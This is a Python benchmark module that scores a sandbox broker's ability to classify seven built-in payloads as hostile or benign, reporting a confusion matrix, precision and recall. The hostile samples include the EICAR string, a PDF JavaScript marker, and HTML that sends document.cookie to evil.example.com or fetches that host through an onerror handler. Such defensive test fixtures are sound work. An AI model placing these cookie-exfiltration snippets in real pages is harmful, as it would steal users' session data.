"""Sandbox bench — measures the SandboxBroker's classify-hostile/benign accuracy
against a labeled set of payloads.

Design notes
------------
* Uses ``build_default_broker`` from ``lighthouse_ai.sandbox.broker``.
* Verdicts: ADMIT → benign prediction; QUARANTINE or REJECT → hostile prediction.
* We compute a full confusion matrix (TP/FP/TN/FN):
    - TP: hostile payload caught (quarantine or reject)
    - FP: benign payload falsely flagged (quarantine or reject)
    - TN: benign payload correctly admitted
    - FN: hostile payload missed (admitted)
* The zero-FP contract on benign payloads is a hard requirement — ``build_default_broker``
  must not flag benign documents. This is asserted in the test suite.
* All payloads are built in-code so the bench runs with no data files.
"""

from __future__ import annotations

import tempfile
from dataclasses import dataclass
from pathlib import Path

from ..sandbox.scanners import EICAR_SIGNATURE

__all__ = ["BENCH_PAYLOADS", "LabeledPayload", "run_sandbox_bench"]


@dataclass(frozen=True)
class LabeledPayload:
    """A payload with its ground-truth hostility label and expected outcome.

    ``label`` is ``"hostile"`` or ``"benign"``.
    ``description`` is a human-readable name for reporting.
    ``expect_verdict`` is the minimum strictness of verdict the broker should
    return (``"reject"`` means we also accept reject; ``"quarantine"`` means
    quarantine *or* reject; ``"admit"`` means exactly admit).
    """

    payload: bytes
    content_type: str | None
    filename: str | None
    label: str  # "hostile" | "benign"
    description: str
    expect_verdict: str  # "admit" | "quarantine" | "reject"


# ---------------------------------------------------------------------------
# Hand-built labeled payloads
# ---------------------------------------------------------------------------

# --- Hostile payloads -------------------------------------------------------

# 1. EICAR antivirus test string (industry-standard synthetic malware marker)
_EICAR_PAYLOAD = EICAR_SIGNATURE + b"\n"

# 2. PDF with /JavaScript active-content marker
_PDF_JS_PAYLOAD = b"%PDF-1.4 1 0 obj << /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >> endobj\n/JavaScript (alert('xss'))"

# 3. HTML with <script> tag — triggers HTMLScriptScanner
_SCRIPT_HTML_PAYLOAD = b"""<!DOCTYPE html>
<html><head><title>Malicious</title></head>
<body>
<script>document.location='http://evil.example.com/'+document.cookie;</script>
<p>Nothing to see here.</p>
</body></html>
"""

# 4. HTML with inline event handler
_EVENT_HANDLER_HTML = b"""<html><body>
<img src="x" onerror="fetch('http://evil.example.com')" />
<p>Innocent image caption.</p>
</body></html>
"""

# --- Benign payloads --------------------------------------------------------

# 5. Plain-text research note — no markup, no scripts
_BENIGN_PLAIN = b"""Quantum computing leverages superposition and entanglement.
Shor's algorithm factors large integers in polynomial time.
This has implications for RSA encryption.
"""

# 6. Clean HTML article — no scripts, no event handlers
_BENIGN_HTML = b"""<!DOCTYPE html>
<html>
<head><title>Clean Article</title></head>
<body>
<h1>Introduction to Machine Learning</h1>
<p>Machine learning is a branch of artificial intelligence that enables
computers to learn from data without being explicitly programmed.</p>
<p>Supervised learning, unsupervised learning, and reinforcement learning
are the three main paradigms.</p>
</body>
</html>
"""

# 7. Minimal valid PDF without any active-content markers
_BENIGN_PDF = (
    b"%PDF-1.4\n"
    b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
    b"xref\n0 3\n"
    b"0000000000 65535 f \n"
    b"0000000009 00000 n \n"
    b"0000000058 00000 n \n"
    b"trailer\n<< /Size 3 /Root 1 0 R >>\n"
    b"startxref\n110\n%%EOF\n"
)

BENCH_PAYLOADS: tuple[LabeledPayload, ...] = (
    LabeledPayload(
        payload=_EICAR_PAYLOAD,
        content_type="application/octet-stream",
        filename="eicar.com",
        label="hostile",
        description="EICAR antivirus test string",
        expect_verdict="reject",
    ),
    LabeledPayload(
        payload=_PDF_JS_PAYLOAD,
        content_type="application/pdf",
        filename="active.pdf",
        label="hostile",
        description="PDF with /JavaScript active-content marker",
        expect_verdict="quarantine",
    ),
    LabeledPayload(
        payload=_SCRIPT_HTML_PAYLOAD,
        content_type="text/html",
        filename="malicious.html",
        label="hostile",
        description="HTML with <script> tag exfiltration",
        expect_verdict="quarantine",
    ),
    LabeledPayload(
        payload=_EVENT_HANDLER_HTML,
        content_type="text/html",
        filename="event.html",
        label="hostile",
        description="HTML with onerror event handler",
        expect_verdict="quarantine",
    ),
    LabeledPayload(
        payload=_BENIGN_PLAIN,
        content_type="text/plain",
        filename="quantum.txt",
        label="benign",
        description="Plain-text research note",
        expect_verdict="admit",
    ),
    LabeledPayload(
        payload=_BENIGN_HTML,
        content_type="text/html",
        filename="article.html",
        label="benign",
        description="Clean HTML article, no scripts",
        expect_verdict="admit",
    ),
    LabeledPayload(
        payload=_BENIGN_PDF,
        content_type="application/pdf",
        filename="minimal.pdf",
        label="benign",
        description="Minimal PDF without active-content markers",
        expect_verdict="admit",
    ),
)


def _verdict_is_hostile(verdict_value: str) -> bool:
    """Map broker verdict string to predicted-hostile boolean.

    ADMIT → benign prediction; QUARANTINE or REJECT → hostile prediction.
    """
    return verdict_value in ("quarantine", "reject")


def run_sandbox_bench(
    data_dir: str | Path | None = None,
    *,
    payloads: tuple[LabeledPayload, ...] | None = None,
) -> dict:
    """Run the sandbox bench and return a metrics dict.

    Parameters
    ----------
    data_dir:
        Directory for the quarantine database and artifacts.  When ``None`` a
        temporary directory is created and cleaned up automatically so the bench
        is hermetic and leaves no disk artifacts.
    payloads:
        Override the default ``BENCH_PAYLOADS`` (useful for focused tests).

    Returns
    -------
    dict with keys:
        ``tp``  — hostile payloads correctly caught (int)
        ``fp``  — benign payloads falsely flagged (int)
        ``tn``  — benign payloads correctly admitted (int)
        ``fn``  — hostile payloads missed (int)
        ``precision`` — TP / (TP + FP), 1.0 when no positives predicted
        ``recall``    — TP / (TP + FN), 0.0 when no hostile payloads
        ``false_positive_rate`` — FP / (FP + TN), should be 0.0
        ``per_case``  — list of per-case result dicts
        ``n_hostile``  — total hostile payloads in bench
        ``n_benign``   — total benign payloads in bench
    """
    from ..sandbox.broker import build_default_broker

    active_payloads = payloads if payloads is not None else BENCH_PAYLOADS

    _own_tmpdir = data_dir is None
    _tmpdir_obj = None
    if _own_tmpdir:
        _tmpdir_obj = tempfile.TemporaryDirectory()
        resolved_dir = Path(_tmpdir_obj.name)
    else:
        resolved_dir = Path(data_dir)  # type: ignore[arg-type]
        resolved_dir.mkdir(parents=True, exist_ok=True)

    try:
        broker = build_default_broker(resolved_dir)
        tp = fp = tn = fn = 0
        per_case: list[dict] = []

        for lp in active_payloads:
            outcome = broker.admit(
                lp.payload,
                filename=lp.filename,
                content_type=lp.content_type,
            )
            verdict_str = outcome.verdict.value  # "admit" | "quarantine" | "reject"
            predicted_hostile = _verdict_is_hostile(verdict_str)
            actually_hostile = lp.label == "hostile"

            if actually_hostile and predicted_hostile:
                tp += 1
            elif not actually_hostile and predicted_hostile:
                fp += 1
            elif not actually_hostile and not predicted_hostile:
                tn += 1
            else:
                fn += 1

            per_case.append(
                {
                    "description": lp.description,
                    "label": lp.label,
                    "verdict": verdict_str,
                    "predicted_hostile": predicted_hostile,
                    "correct": (predicted_hostile == actually_hostile),
                }
            )
    finally:
        if _own_tmpdir and _tmpdir_obj is not None:
            _tmpdir_obj.cleanup()

    n_hostile = sum(1 for lp in active_payloads if lp.label == "hostile")
    n_benign = sum(1 for lp in active_payloads if lp.label == "benign")
    precision = tp / (tp + fp) if (tp + fp) > 0 else 1.0
    recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
    fpr = fp / (fp + tn) if (fp + tn) > 0 else 0.0

    return {
        "tp": tp,
        "fp": fp,
        "tn": tn,
        "fn": fn,
        "precision": round(precision, 4),
        "recall": round(recall, 4),
        "false_positive_rate": round(fpr, 4),
        "per_case": per_case,
        "n_hostile": n_hostile,
        "n_benign": n_benign,
    }
